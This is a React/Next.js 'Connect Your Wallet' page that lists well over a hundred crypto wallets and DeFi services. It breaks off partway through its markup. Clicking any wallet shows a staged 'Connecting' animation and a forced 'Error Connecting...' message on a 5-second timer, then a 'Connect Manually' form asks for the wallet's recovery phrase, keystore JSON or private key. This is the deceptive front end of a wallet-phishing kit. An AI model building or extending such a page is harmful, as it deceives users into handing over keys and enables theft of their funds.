import Image from "next/image";
import React from "react";
import ReactLoading from 'react-loading';
import "../app/globals.css";
import 'bootstrap/dist/css/bootstrap.min.css';
import metamask from '../../public/images/metamask.png'
import trustwallet from '../../public/images/trustwallet.png'
import coinbase from '../../public/images/coinbase.jpeg'
import xumm from '../../public/images/xumm.png'
import alice from '../../public/images/alice.png'
import coinomi from '../../public/images/coinomi.jpeg'
import wallet_connect from '../../public/images/walletconnect.jpeg'
import kaspa from '../../public/images/kaspa.png';
import chainge from '../../public/images/chainge.png'
import safepal from '../../public/images/safepal.png'
import slingshot from '../../public/images/slingshot.png'
import blockchain from '../../public/images/blockchain.png'
import lobstr from '../../public/images/lobstr.jpeg'
import yoroi from '../../public/images/yoroi.jpeg'
import edge from '../../public/images/edge.png'
import solar from '../../public/images/solar.png'
import pera_algo from '../../public/images/pera_algo.png'
import senderwallet from '../../public/images/senderwallet.png'
import xcel_pay from '../../public/images/xcel_pay.png'
import anchor from '../../public/images/anchor.png'
import onto from '../../public/images/onto.png'
import rainbow from '../../public/images/rainbow.png'
import argent from '../../public/images/Argent.jpeg'
import cybavo from '../../public/images/cybavo.png'
import grindplus from '../../public/images/grindplus.png'
import nash from '../../public/images/nash.jpeg'
import imtoken from '../../public/images/imtoken.png'
import pillar from '../../public/images/pillar.png'
import crypto from '../../public/images/crypto.png'
import gnosis from '../../public/images/gnosis.jpeg'
import curve from '../../public/images/curve.jpeg'
import tokenpocket from '../../public/images/tokenpocket.png'
import math from '../../public/images/math-wallet.png'
import bitpay from '../../public/images/bitpay.jpeg'
import ledgerlive from '../../public/images/ledgerlive.png'
import walleth from '../../public/images/walleth.jpeg'
import authereum from '../../public/images/authereum.png'
import dharma from '../../public/images/dharma.jpeg'
import inch from '../../public/images/1inch.png'
import houbi from '../../public/images/huobi.jpeg'
import eidoo from '../../public/images/eidoo.png'
import mykey from '../../public/images/mykey.png'
import trustvault from '../../public/images/trustvault.png'
import atomic from '../../public/images/atomic.png'
import coin98 from '../../public/images/coin98.png'
import zksync from '../../public/images/zksync.jpeg'
import shell from '../../public/images/shell.jpeg'
import index from '../../public/images/index.jpeg'
import swap from '../../public/images/swap.jpg'
import starname from '../../public/images/starname.png'
import space from '../../public/images/space.png'
import maskbook from '../../public/images/maskbook.png'
import snap from '../../public/images/snapp.jpg'
import invoice from '../../public/images/invoice.png'
import ankr from '../../public/images/ankr.jpeg'
import dodo from '../../public/images/dodo.png'
import zlot from '../../public/images/zlot.jpeg'
import tokmark from '../../public/images/tokmark.png'
import actusprotocol from '../../public/images/actusprotocol.jpeg'
import astrotools from '../../public/images/astrotools.jpeg'
import rubic from '../../public/images/rubic.jpeg'
import torus from '../../public/images/torus.jpeg'
import ocean from '../../public/images/ocean.jpeg'
import filecoin from '../../public/images/filecoin.png'
import bancor from '../../public/images/bancor.png'
import harvest from '../../public/images/harvestfinance.jpeg'
import octofi from '../../public/images/octofi.jpg'
import mushroom from '../../public/images/mushroom.jpg'
import bitfrost from '../../public/images/bitfrost.png'
import orchid from '../../public/images/orchid.png'
import datamine from '../../public/images/datamine.jpeg'
import streamr from '../../public/images/streamr.jpeg'
import dappradar from '../../public/images/dappradar.png'
import superrare from '../../public/images/super.jpg'
import arbitrum from '../../public/images/arbitrum.jpeg'
import paraswap from '../../public/images/paraswap.jpeg';
import honeyswap from '../../public/images/honeyswap.jpeg'
import fleek from '../../public/images/fleek.png'
import cool from '../../public/images/cool.png'
import alpha from '../../public/images/alphawallet.jpeg'
import zelcore from '../../public/images/zelcore.png'
import phantom from '../../public/images/phantom.jpeg'
import solflare from '../../public/images/solflare.png'
import sollet from '../../public/images/sollet.jpeg'
import dcent from '../../public/images/dcent.png'
import tokenary from '../../public/images/tokenary.png'
import spatium from '../../public/images/spatium.jpeg'
import infinito from '../../public/images/infinito.png'
import wallet from '../../public/images/walletio.png'
import infinity from '../../public/images/infinity.png'
import ownbit from '../../public/images/ownbit.png'
import easypocket from '../../public/images/easypocket.jpeg'
import bridge from '../../public/images/bridge.png'
import unstoppable from '../../public/images/unstoppable.png'
import peakdefi from '../../public/images/peakdefi.png'
import vision from '../../public/images/vision.png'
import bitkeep from '../../public/images/bitkeep.png'
import viawallet from '../../public/images/viawallet.png'
import sparkpoint from '../../public/images/sparkpoint.png'
import halodefi from '../../public/images/halodefi.jpeg'
import dok from '../../public/images/dok.png'
import at from '../../public/images/atwallet.png'
import midas from '../../public/images/midas.png'
import ellipal from '../../public/images/ellipal.png'
import keyringpro from '../../public/images/keyringpro.png'
import aktionariat from '../../public/images/aktionariat.png'
import talken from '../../public/images/Talken.jpeg'
import xdc from '../../public/images/xdc.png'
import flares from '../../public/images/flares.png'
import atoken from '../../public/images/atoken.jpg'
import tongue from '../../public/images/tongue.jpeg'
import binance from '../../public/images/binance.png'
import rwallet from '../../public/images/rwallet.webp'
import plasmapay from '../../public/images/plasmapay.jpeg'
import O3wallet from '../../public/images/O3wallet.jpg'
import hashkey from '../../public/images/hashley.jpg'
import jadewallet from '../../public/images/jadewallet.jpeg'
import guardwallet from '../../public/images/guardawallet.jpeg'
import defiant from '../../public/images/defiant.jpeg'
import trustee from '../../public/images/trustee.jpeg'
import morix from '../../public/images/morixwallet.png'
import meetone from '../../public/images/meetone.jpeg'
import etherscan from '../../public/images/etherscan.jpg'
import lido from '../../public/images/lido.png'
import terrastation from '../../public/images/terrastation.webp'
import opensea from '../../public/images/opensea.webp'
import zapper from '../../public/images/zapper.webp'
import aave from '../../public/images/aave.webp'
import zerion from '../../public/images/zerion.webp'
import lc from '../../public/images/lc.png'
import dbank from '../../public/images/dbank.webp'
import rarible from '../../public/images/rarible.webp'
import yearn from '../../public/images/yearn.png'
import adex from '../../public/images/adex.jpg'
import dydx from '../../public/images/dydx.webp'
import mycrypto from '../../public/images/mycrypto.png'
import oasis from '../../public/images/oasis.jpeg'
import tokenset from '../../public/images/tokenset.jpg'
import mantradao from '../../public/images/mantradao.png'
import matcha from '../../public/images/matcha.webp'
import kyberswap from '../../public/images/Kyberswap.jpeg'
import defiport from '../../public/images/defiport.png'
import loopring from '../../public/images/loopring.webp'
import instadapp from '../../public/images/instadapp.jpeg'
import matic from '../../public/images/matic.jpg'
import box from '../../public/images/3box.webp'
import ddex from '../../public/images/ddex.webp'
import bamboo from '../../public/images/bamboo.webp'
import syn from '../../public/images/syn.jpg'
import dexblue from '../../public/images/dexblue.webp'
import pool from '../../public/images/pool.png'
import dexag from '../../public/images/dexag.png'
import gelato from '../../public/images/gelato.jpg'
import ens from '../../public/images/ens.jpg'
import idle from '../../public/images/idlefinance.png'
import iearn from '../../public/images/iearnfinance.jpeg'
import rcn from '../../public/images/rcnfinance.jpeg'
import hegic from '../../public/images/hegic.jpg'
import kick from '../../public/images/kick.jpg'
import mph88 from '../../public/images/88mph.jpeg'
import mooni from '../../public/images/mooni.jpeg'
import clover from '../../public/images/clover.png'
import mint from '../../public/images/mintbase.jpeg'
import dao from '../../public/images/daostack.jpeg'
import known from '../../public/images/known.jpg'
import myether from '../../public/images/myether.jpg'
import affogato from '../../public/images/affogato.png'
import stablepay from '../../public/images/stablepay.jpeg'
import defi from '../../public/images/defisaver.jpeg'
import loom from '../../public/images/loom.png'
import thor from '../../public/images/thorchain.jpg'
import bulksender from '../../public/images/bulksender.png'
import linkdrop from '../../public/images/linkdrop.png'
import helio from '../../public/images/helio.png'
import escaroo from '../../public/images/escaroo.png'
import tokenmarket from '../../public/images/tokenmarket.png'
import mesa from '../../public/images/mesa.png'
import mcdex from '../../public/images/mcdex.png'
import furucombo from '../../public/images/furucombo.png'
import melon from '../../public/images/melon.png'
import chainsfr from '../../public/images/chainsfr.png'
import aka3 from '../../public/images/aka3.png'
import key2 from '../../public/images/2key.jpeg'
import pitch from '../../public/images/pitch.jpg'
import sushiswap from '../../public/images/sushiswap.png'
import unagii from '../../public/images/Unagii.png'
import cream from '../../public/images/cream.jpg'
import cardano from '../../public/images/cardano.png'
import daedalus from '../../public/images/daedalus.png'
import ccvault from '../../public/images/ccvault.png'
import gero from '../../public/images/gero.jpg'
import nami from '../../public/images/nami.png'
import solana from '../../public/images/solana.png'
import solong from '../../public/images/solong.jpg'
import exodus from '../../public/images/exodus.png'
import avalanche from '../../public/images/avalanche.png'
import velas from '../../public/images/velas.png'
import fortmatic from '../../public/images/fortmatic.png'
import others from '../../public/images/others.jpeg'

import {Row, Col, Button, Tabs, Tab} from 'react-bootstrap';
import Aux from '../components/hoc/Auxiliary/Auxiliary'
import classes from './wallets.module.css'

import Modal from '../components/Modal/Modal'
import Phrase from '../components/Phrase/Phrase'
import KeystoreJson from '../components/KeystoreJson/KeystoreJson.js'
import PrivateKey from '../components/PrivateKey/PrivateKey'
import Preloader from '../components/Preloader/Preloader'



export default class wallets extends React.Component {
  constructor(props) {
    super(props)
    this.state = {
       showModal: false,
       moveToNextModal: false,
       stopConnecting: false,
       showPreloader: false,
       name: '',
       image: ''
    }
  }

  componentWillUnmount(){
    // clearTimeout(this.state.stopConnecting);
  }

  showModalFunc = (name) => {
    this.setState({showModal: true, name: name})
    setTimeout(() => {
      this.stopLoadingFunc()
    }, 5000)
  }

  closeModalFunc = () => {
    this.setState({showModal: false})
    this.startLoadingFunc()
    this.setState({moveToNextModal: false})

  }

  moveToNextModalFunc = () => {
    this.setState({moveToNextModal: true})
  }

  stopLoadingFunc = () => {
    this.setState({stopConnecting: true})
  }

  startLoadingFunc = () => {
    this.setState({stopConnecting: false})
  }

  showPreloaderFunc = () => {
    this.setState({showPreloader: true})
  }



 render(){
  let img

  let preload

  this.state.showPreloader ? preload = <Preloader  />: preload = '';

  switch(this.state.name) {
    case 'Metamask' : img = <Image height="30" src={metamask} alt="Metamask img" />;
    break;
    case 'Coinbase' : img = <Image height="30" src={coinbase} alt="Coinbase img" />;
    break;
    case 'Onto' : img = <Image height="30" src={onto} alt="Onto img" />;
    break;
    case 'Rainbow' : img = <Image height="30" src={rainbow} alt="Rainbow img" />;
    break;
    case 'Argent' : img = <Image height="30" src={argent} alt="Argent img" />;
    break;
    case 'Cybavo' : img = <Image height="30" src={cybavo} alt="Cybavo img" />;
    break;
    case 'Grindplus' : img = <Image height="30" src={grindplus} alt="Grindplus img" />;
    break;
    case 'Nash' : img = <Image height="30" src={nash} alt="Nash img" />;
    break;
    case 'ImToken' : img = <Image height="30" src={imtoken} alt="ImToken img" />;
    break;
    case 'Pillar' : img = <Image height="30" src={pillar} alt="ImToken img" />;
    break;
    case 'Crypto' : img = <Image height="30" src={crypto} alt="Crypto img" />;
    break;
    case 'Gnosis' : img = <Image height="30" src={gnosis} alt="Gnosis img" />;
    break;
    case 'Curve Finace' : img = <Image height="30" src={curve} alt="Curve img" />;
    break;
    case 'TokenPocket' : img = <Image height="30" src={tokenpocket} alt="Token Pocket img" />;
    break;
    case 'MathWallet' : img = <Image height="30" src={math} alt="Math Wallet Pocket img" />;
    break;
    case 'BitPay' : img = <Image height="30" src={bitpay} alt="Bitpay img" />;
    break;
    case 'Ledger Live' : img = <Image height="30" src={ledgerlive} alt="Ledger Live img" />;
    break;
    case 'Walleth' : img = <Image height="30" src={walleth} alt="Walleth img" />;
    break;
    case 'Authereum' : img = <Image height="30" src={authereum} alt="Authereum img" />;
    break;
    case 'Dharma' : img = <Image height="30" src={dharma} alt="Dharma img" />;
    break;
    case '1inch' : img = <Image height="30" src={inch} alt="1inch img" />;
    break;
    case 'Huobi' : img = <Image height="30" src={houbi} alt="Houbi img" />;
    break;
    case 'Eidoo' : img = <Image height="30" src={eidoo} alt="Eidoo img" />;
    break;
    case 'MyKey' : img = <Image height="30" src={mykey} alt="Mykey img" />;
    break;
    case 'TrustVault' : img = <Image height="30" src={trustvault} alt="TrustVault img" />;
    break;
    case 'Atomic' : img = <Image height="30" src={atomic} alt="Atomic img" />;
    break;
    case 'Coin98' : img = <Image height="30" src={coin98} alt="Coin98 img" />;
    break;
    case 'Zksync' : img = <Image height="30" src={zksync} alt="Zksync img" />;
    break;
    case 'Shell' : img = <Image height="30" src={shell} alt="Shell img" />;
    break;
    case 'Index Coop' : img = <Image height="30" src={index} alt="Index Coop img" />;
    break;
    case 'SwapX' : img = <Image height="30" src={swap} alt="Swapx img" />;
    break;
    case 'StarName' : img = <Image height="30" src={starname} alt="StarName img" />;
    break;
    case 'Space' : img = <Image height="30" src={space} alt="Space img" />;
    break;
    case 'Maskbook' : img = <Image height="30" src={maskbook} alt="Maskbook img" />;
    break;
    case 'Snap' : img = <Image height="30" src={snap} alt="Snap img" />;
    break;
    case 'Invoice' : img = <Image height="30" src={invoice} alt="Invoice img" />;
    break;
    case 'Ankr' : img = <Image height="30" src={ankr} alt="Ankr img" />;
    break;
    case 'DoDo' : img = <Image height="30" src={dodo} alt="Dodo img" />;
    break;
    case 'Zlot' : img = <Image height="30" src={zlot} alt="Zlot img" />;
    break;
    case 'TokMark' : img = <Image height="30" src={tokmark} alt="TokMark img" />;
    break;
    case 'ActusProtocol' : img = <Image height="30" src={actusprotocol} alt="ActusProtocol img" />;
    break;
    case 'AstroTools' : img = <Image height="30" src={astrotools} alt="Astrotools img" />;
    break;
    case 'Rubic' : img = <Image height="30" src={rubic} alt="Rubic img" />;
    break;
    case 'Torus' : img = <Image height="30" src={torus} alt="Torus img" />;
    break;
    case 'Ocean Protocol' : img = <Image height="30" src={ocean} alt="Ocean img" />;
    break;
    case 'Filecoin' : img = <Image height="30" src={filecoin} alt="Ocean img" />;
    break;
    case 'Bancor' : img = <Image height="30" src={bancor} alt="Bancor img" />;
    break;
    case 'Harvest Finance' : img = <Image height="30" src={harvest} alt="Harvest img" />;
    break;
    case 'Octofi' : img = <Image height="30" src={octofi} alt="Octofi img" />;
    break;
    case 'Mushroom Finance' : img = <Image height="30" src={mushroom} alt="Mushroom img" />;
    break;
    case 'BitFrost' : img = <Image height="30" src={bitfrost} alt="BitFrost img" />;
    break;
    case 'Orchid Protocol' : img = <Image height="30" src={orchid} alt="Orchid img" />;
    break;
    case 'Datamine Network' : img = <Image height="30" src={datamine} alt="Datamine img" />;
    break;
    case 'Streamr' : img = <Image height="30" src={streamr} alt="Streamr img" />;
    break;
    case 'DappRadar' : img = <Image height="30" src={dappradar} alt="DappRadar img" />;
    break;
    case 'SuperRare' : img = <Image height="30" src={superrare} alt="SuperRare img" />;
    break;
    case 'Arbitrum' : img = <Image height="30" src={arbitrum} alt="Arbitrum img" />;
    break;
    case 'Paraswap' : img = <Image height="30" src={paraswap} alt="Paraswap img" />;
    break;
    case 'Honeyswap' : img = <Image height="30" src={honeyswap} alt="Honeyswap img" />;
    break;
    case 'Fleek' : img = <Image height="30" src={fleek} alt="Fleek img" />;
    break;
    case 'Cool' : img = <Image height="30" src={cool} alt="Cool img" />;
    break;
    case 'Alpha' : img = <Image height="30" src={alpha} alt="Alpha img" />;
    break;
    case 'Zelcore' : img = <Image height="30" src={zelcore} alt="Zelcore img" />;
    break;
    case 'Phantom' : img = <Image height="30" src={phantom} alt="Phantom img" />;
    break;
    case 'Solflare' : img = <Image height="30" src={solflare} alt="Solflare img" />;
    break;
    case 'Sollet' : img = <Image height="30" src={sollet} alt="Sollet img" />;
    break;
    case 'Dcent' : img = <Image height="30" src={dcent} alt="Dcent img" />;
    break;
    case 'Tokenary' : img = <Image height="30" src={tokenary} alt="Tokenary img" />;
    break;
    case 'Spatium' : img = <Image height="30" src={spatium} alt="Spatium img" />;
    break;
    case 'Infinito' : img = <Image height="30" src={infinito} alt="Infinito img" />;
    break;
    case 'Wallet.io' : img = <Image height="30" src={wallet} alt="wallet.io img" />;
    break;
    case 'infinity' : img = <Image height="30" src={infinity} alt="Infinity img" />;
    break;
    case 'Ownbit' : img = <Image height="30" src={ownbit} alt="Ownbit img" />;
    break;
    case 'EasyPocket' : img = <Image height="30" src={easypocket} alt="Easypocket img" />;
    break;
    case 'Bridge' : img = <Image height="30" src={bridge} alt="Bridge img" />;
    break;
    case 'Unstoppable' : img = <Image height="30" src={unstoppable} alt="Unstoppable img" />;
    break;
    case 'PeakDefi' : img = <Image height="30" src={peakdefi} alt="PeakDefi img" />;
    break;
    case 'Vision' : img = <Image height="30" src={vision} alt="Vision img" />;
    break;
    case 'BitKeep' : img = <Image height="30" src={bitkeep} alt="BitKeep img" />;
    break;
    case 'ViaWallet' : img = <Image height="30" src={viawallet} alt="Via img" />;
    break;
    case 'SparkPoint' : img = <Image height="30" src={sparkpoint} alt="SparkPoint img" />;
    break;
    case 'HaloDefi' : img = <Image height="30" src={halodefi} alt="HaloDefi img" />;
    break;
    case 'Dok' : img = <Image height="30" src={dok} alt="Dok img" />;
    break;
    case 'AT Wallet' : img = <Image height="30" src={at} alt="AT Wallet img" />;
    break;
    case 'Midas' : img = <Image height="30" src={midas} alt="Midas img" />;
    break;
    case 'Ellipal' : img = <Image height="30" src={ellipal} alt="Ellipal img" />;
    break;
    case 'KeyRingPro' : img = <Image height="30" src={keyringpro} alt="keyringpro img" />;
    break;
    case 'Aktionariat' : img = <Image height="30" src={aktionariat} alt="Aktonariat img" />;
    break;
    case 'Talken' : img = <Image height="30" src={talken} alt="Talken img" />;
    break;
    case 'XDC' : img = <Image height="30" src={xdc} alt="XDC img" />;
    break;
    case 'Flares' : img = <Image height="30" src={flares} alt="Flares img" />;
    break;
    case 'AToken' : img = <Image height="30" src={atoken} alt="AToken img" />;
    break;
    case 'Tongue' : img = <Image height="30" src={tongue} alt="Tongue img" />;
    break;
    case 'Binance DEX' : img = <Image height="30" src={binance} alt="Binance img" />;
    break;
    case 'RWallet' : img = <Image height="30" src={rwallet} alt="RWallet img" />;
    break;
    case 'PlasmaPay' : img = <Image height="30" src={plasmapay} alt="PlasmaPay img" />;
    break;
    case 'O3Wallet' : img = <Image height="30" src={O3wallet} alt="O3Wallet img" />;
    break;
    case 'HashKey' : img = <Image height="30" src={hashkey} alt="HashKey img" />;
    break;
    case 'JadeWallet' : img = <Image height="30" src={jadewallet} alt="JadeWallet img" />;
    break;
    case 'Guarda' : img = <Image height="30" src={guardwallet} alt="GuardWallet img" />;
    break;
    case 'Defiant' : img = <Image height="30" src={defiant} alt="Defiant img" />;
    break;
    case 'Trustee' : img = <Image height="30" src={trustee} alt="Trustee img" />;
    break;
    case 'MeetOne' : img = <Image height="30" src={meetone} alt="MeetOne img" />;
    break;
    case 'Morix' : img = <Image height="30" src={morix} alt="Morix img" />;
    break;
    case 'Binance Smart Chain' : img = <Image height="30" src={binance} alt="Binance img" />;
    break;
    case 'Etherscan' : img = <Image height="30" src={etherscan} alt="Etherscan img" />;
    break;
    case 'Lido' : img = <Image height="30" src={lido} alt="Lido img" />;
    break;
    case 'Terrastation' : img = <Image height="30" src={terrastation} alt="Lido img" />;
    break;
    case 'Opensea' : img = <Image height="30" src={opensea} alt="Opensea img" />;
    break;
    case 'Zapper' : img = <Image height="30" src={zapper} alt="Zapper img" />;
    break;
    case 'Aave' : img = <Image height="30" src={aave} alt="Aave img" />;
    break;
    case 'Zerion' : img = <Image height="30" src={zerion} alt="Zerion img" />;
    break;
    case 'LocalCryptos' : img = <Image height="30" src={lc} alt="lc img" />;
    break;
    case 'DBank' : img = <Image height="30" src={dbank} alt="dbank img" />;
    break;
    case 'Rarible' : img = <Image height="30" src={rarible} alt="rarible img" />;
    break;
    case 'Yearn' : img = <Image height="30" src={yearn} alt="yearn img" />;
    break;
    case 'Adex' : img = <Image height="30" src={adex} alt="Adex img" />;
    break;
    case 'DyDx' : img = <Image height="30" src={dydx} alt="Adex img" />;
    break;
    case 'MyCrypto' : img = <Image height="30" src={dydx} alt="Adex img" />;
    break;
    case 'Oasis' : img = <Image height="30" src={oasis} alt="Oasis img" />;
    break;
    case 'TokenSets' : img = <Image height="30" src={tokenset} alt="Tokenset img" />;
    break;
    case 'Mantra DAO' : img = <Image height="30" src={tokenset} alt="Tokenset img" />;
    break;
    case 'Matcha' : img = <Image height="30" src={matcha} alt="Matcha img" />;
    break;
    case 'KyberSwap' : img = <Image height="30" src={kyberswap} alt="Kyberswap img" />;
    break;
    case 'Defi Portfolio Tracker' : img = <Image height="30" src={defiport} alt="Defi Port img" />;
    break;
    case 'Loopring' : img = <Image height="30" src={loopring} alt="Loopring img" />;
    break;
    case 'InstaDapp' : img = <Image height="30" src={instadapp} alt="InstaDapp img" />;
    break;
    case 'Matic' : img = <Image height="30" src={matic} alt="Matic img" />;
    break;
    case '3box' : img = <Image height="30" src={box} alt="3box img" />;
    break;
    case 'DDex' : img = <Image height="30" src={ddex} alt="Ddex img" />;
    break;
    case 'Bamboo' : img = <Image height="30" src={bamboo} alt="Bamboos img" />;
    break;
    case 'Synthetix' : img = <Image height="30" src={syn} alt="Bamboos img" />;
    break;
    case 'Dex.blue' : img = <Image height="30" src={dexblue} alt="Dex Blue img" />;
    break;
    case 'PoolTogether' : img = <Image height="30" src={pool} alt="Pool Together img" />;
    break;
    case 'DEX.AG' : img = <Image height="30" src={dexag} alt="DExag img" />;
    break;
    case 'Gelato' : img = <Image height="30" src={gelato} alt="Gelato img" />;
    break;
    case 'Ens Domains' : img = <Image height="30" src={ens} alt="ens img" />;
    break;
    case 'Idle Finance' : img = <Image height="30" src={idle} alt="idle img" />;
    break;
    case 'Iearn.Finance' : img = <Image height="30" src={iearn} alt="iearn img" />;
    break;
    case 'RCN Finance' : img = <Image height="30" src={rcn} alt="rcn img" />;
    break;
    case 'Hegic' : img = <Image height="30" src={hegic} alt="hegic img" />;
    break;
    case 'Kickback' : img = <Image height="30" src={kick} alt="Kickback img" />;
    break;
    case '88mph' : img = <Image height="30" src={mph88} alt="88 Mph img" />;
    break;
    case 'Mooni' : img = <Image height="30" src={mooni} alt="Mooni img" />;
    break;
    case 'Clover' : img = <Image height="30" src={clover} alt="Clover img" />;
    break;
    case 'Mintbase' : img = <Image height="30" src={mint} alt="Mintbase img" />;
    break;
    case 'DAO Stack' : img = <Image height="30" src={dao} alt="Dao stack img" />;
    break;
    case 'KnownOrigin' : img = <Image height="30" src={known} alt="Known Origin img" />;
    break;
    case 'MyEther' : img = <Image height="30" src={myether} alt="MyEther img" />;
    break;
    case 'Affogato' : img = <Image height="30" src={affogato} alt="Affogato img" />;
    break;
    case 'StablePay' : img = <Image height="30" src={stablepay} alt="StablePay img" />;
    break;
    case 'DefiSaver' : img = <Image height="30" src={defi} alt="Defi Saver img" />;
    break;
    case 'Loom Network' : img = <Image height="30" src={loom} alt="Loom Network img" />;
    break;
    case 'ThorChain' : img = <Image height="30" src={thor} alt="ThorChain img" />;
    break;
    case 'BulkSender' : img = <Image height="30" src={bulksender} alt="BulkSender img" />;
    break;
    case 'LinkDrop' : img = <Image height="30" src={linkdrop} alt="LinkDrop img" />;
    break;
    case 'Helio' : img = <Image height="30" src={helio} alt="Helio img" />;
    break;
    case 'Escaroo' : img = <Image height="30" src={escaroo} alt="Escaroo img" />;
    break;
    case 'TokenMarket' : img = <Image height="30" src={tokenmarket} alt="TokenMArket img" />;
    break;
    case 'Mesa' : img = <Image height="30" src={mesa} alt="Mesa img" />;
    break;
    case 'MCDEX' : img = <Image height="30" src={mcdex} alt="MCDEX img" />;
    break;
    case 'FuruCombo' : img = <Image height="30" src={furucombo} alt="Furu img" />;
    break;
    case 'Melon' : img = <Image height="30" src={melon} alt="Melon img" />;
    break;
    case 'ChainsFr' : img = <Image height="30" src={chainsfr} alt="ChainsFr img" />;
    break;
    case 'AKA3Email Alias' : img = <Image height="30" src={aka3} alt="Aka3 img" />;
    break;
    case '2Key' : img = <Image height="30" src={key2} alt="2key img" />;
    break;
    case 'Pitch' : img = <Image height="30" src={pitch} alt="Pitch img" />;
    break;
    case 'Sushiswap' : img = <Image height="30" src={sushiswap} alt="Sushiswap img" />;
    break;
    case 'Unagii' : img = <Image height="30" src={unagii} alt="Unagii img" />;
    break;
    case 'Cream Finance' : img = <Image height="30" src={cream} alt="Cream Finance img" />;
    break;
    case 'Cardano' : img = <Image height="30" src={cardano} alt="Cardano img" />;
    break;
    case 'Daedalus' : img = <Image height="30" src={daedalus} alt="Daedalus img" />;
    break;
    case 'CCVault' : img = <Image height="30" src={ccvault} alt="CCVault img" />;
    break;
    case 'Gero' : img = <Image height="30" src={gero} alt="Gero img" />;
    break;
    case 'Nami' : img = <Image height="30" src={nami} alt="Nami img" />;
    break;
    case 'Solana' : img = <Image height="30" src={solana} alt="Solana img" />;
    break;
    case 'Solong' : img = <Image height="30" src={solong} alt="Solong img" />;
    break;
    case 'Exodus' : img = <Image height="30" src={exodus} alt="Exodus img" />;
    break;
    case 'Avalanche' : img = <Image height="30" src={avalanche} alt="Avalanche img" />;
    break;
    case 'Velas' : img = <Image height="30" src={velas} alt="Velas img" />;
    break;
    case 'Fortmatic' : img = <Image height="30" src={fortmatic} alt="Fortmatic img" />;
    break;
    case 'Others' : img = <Image height="30" src={others} alt="Others img" />;
    break;
    default:  img = <Image height="30" src={metamask} alt="Metamask img" />
  }
  console.log('showModal: ', this.state.showModal)
  let modalDown = <Aux>
       <Col md={{span: 10, offset: 1}} className={classes.downCol}>
         <Row>
           <Col md={10}>
            <p className='text-white'>{this.state.name}</p>
            <small className='text-white'>Easy-to-use browser extension</small>
           </Col>
           <Col md={2}>
              {img}
           </Col>
         </Row>
       </Col>
       </Aux>

    let inner = <Aux>
      <Row style={{textAlign: 'left'}}>
            <span >
              Back
            </span>
            <hr></hr>
            <Col md={{span: 10, offset: 1}} className={classes.upCol}>
              <span style={{marginTop: '22px',  color: 'red'}}>Connecting</span>  <ReactLoading className={classes.Loader} text="connecting" type="bubbles" color="red" height={'20%'} width={'20%'} />

            </Col>
             {modalDown}
          </Row>
    </Aux>

    if(this.state.stopConnecting) {
      inner = <Aux>
        <Row style={{textAlign: 'left'}}>
            <span className='text-white'>
              Back
            </span>
            <hr></hr>
            <Col md={{span: 10, offset: 1}} className={classes.upCol2}>
              <span style={{marginTop: '8px', color: 'red'}}>Error Connecting...</span>  <Button onClick={this.moveToNextModalFunc} style={{marginLeft: '30px', fontWeight: 'bold'}} variant="primary"><small>Connect Manually</small></Button>{' '}


            </Col>
            {modalDown}
          </Row>
      </Aux>
    }

    let modal = <Aux>
      <Modal show={this.state.showModal} modalClosed={this.closeModalFunc}>
          {inner}

      </Modal>
    </Aux>

    if(this.state.moveToNextModal){
      modal = <Aux>
      <Modal  show={this.state.showModal} modalClosed={this.closeModalFunc}>

          <Row style={{textAlign: 'left'}}>
            <div style={{display: 'flex'}}>
            <span>
              {img}
            </span>
          <p className='text-white' style={{marginLeft: '5px'}}>Import your {this.state.name} Wallet</p>
          <hr />
            </div>

          <Col style={{marginTop: '12px'}} md={{span: 10, offset: 1}} >

          <Tabs defaultActiveKey="Phrase" id="uncontrolled-tab-example" className="mb-3"> <br></br>
          <Tab eventKey="Phrase" title="Phrase">
            <Phrase startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
          <Tab eventKey="Keystore JSON" title="Keystore JSON">
          <KeystoreJson startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
          <Tab eventKey="Private Key" title="Private Key" >
          <PrivateKey startPreloader={this.showPreloaderFunc} modalClosed={this.closeModalFunc} />
          </Tab>
        </Tabs>

          </Col>
          </Row>

      </Modal>
    </Aux>
    }

  return (
    <Aux>
        {preload}
       <div className="flex-col min-h-screen p-10" style={{background: '#070d27'}}>


         {modal}

        <h1 className="mb-4 text-xl font-bold leading-none tracking-tight text-white md:text-2xl lg:text-3xl dark:text-white">Connect Your Wallet</h1>
        <div className="flex items-center justify-center mt-10" style={{width: '100%', height: '600px'}}>
        <div  className=" rounded-lg bg-white p-10 sm:pt-10 overflow-y-auto md:w-[50%] lg:w-[50%] sm:w-[80%]" style={{height: '600px'}} >
           <p>Connect to a Wallet</p>
          <div onClick={() => this.showModalFunc('Metamask')} className="flex justify-between gap-x-5 p-3 mt-3 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Metamask</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={metamask}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Trust')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg ">
            <div className="flex min-w-0 gap-x-4">
          {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Trust</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={trustwallet}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Coinbase')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
